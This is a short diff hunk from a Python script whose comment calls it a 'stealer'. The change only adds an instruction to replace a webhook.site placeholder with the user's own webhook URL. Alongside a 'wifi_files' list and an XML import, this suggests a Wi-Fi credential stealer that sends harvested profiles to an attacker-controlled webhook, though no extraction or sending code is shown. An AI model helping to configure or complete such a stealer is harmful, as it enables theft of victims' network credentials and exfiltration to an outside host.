@@ -4,7 +4,7 @@ import xml.etree.ElementTree as ET
 
 
 #steaeler URL
-url = 'https://webhook.site/your-key/'
+url = 'https://webhook.site/your-key/' #replace this with your webhook url
 
 #Lists & Dicts
 wifi_files = []
